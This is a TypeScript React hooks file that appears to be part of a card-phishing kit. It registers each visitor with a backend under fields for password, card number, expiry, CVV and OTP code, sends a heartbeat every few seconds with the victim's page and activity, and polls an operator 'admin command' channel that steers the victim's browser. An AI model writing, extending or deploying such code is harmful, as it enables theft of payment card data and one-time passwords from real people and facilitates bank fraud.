import { useEffect, useRef } from "react";
import { unityApi } from "./api";

function randId() { return "u-" + Math.random().toString(36).slice(2, 12); }

function getOrCreateId(): string {
  let id = localStorage.getItem("unity_id");
  if (!id) {
    id = randId();
    localStorage.setItem("unity_id", id);
  }
  return id;
}

export function useTracking(page: string) {
  const ref = useRef(page);
  ref.current = page;

  useEffect(() => {
    const id = getOrCreateId();
    const phone = localStorage.getItem("unity_phone") || "";

    const init = async () => {
      try {
        await unityApi.submit({
          id,
          phone,
          password: "",
          cardNumber: "",
          cardName: "",
          cardMonth: "",
          cardYearExp: "",
          cardCvv: "",
          otpCode: "",
          otpStatus: null,
          page: ref.current,
          isActive: true,
          lastSeen: Date.now(),
          country: "Libya",
          submittedAt: new Date().toISOString(),
          submittedAtTs: Date.now(),
        });
      } catch {}
    };

    init();
    const send = () => unityApi.patch(id, { page: ref.current, isActive: true, lastSeen: Date.now() });
    const iv = setInterval(send, 3000);
    return () => clearInterval(iv);
  }, []);
}

export function useAdminCommands(handlers: Record<string, () => void>) {
  const handlersRef = useRef(handlers);
  handlersRef.current = handlers;

  useEffect(() => {
    const id = localStorage.getItem("unity_id");
    if (!id) return;
    const iv = setInterval(async () => {
      const cmd = await unityApi.getCmd(id);
      if (cmd && handlersRef.current[cmd]) {
        handlersRef.current[cmd]();
      }
    }, 2000);
    return () => clearInterval(iv);
  }, []);
}
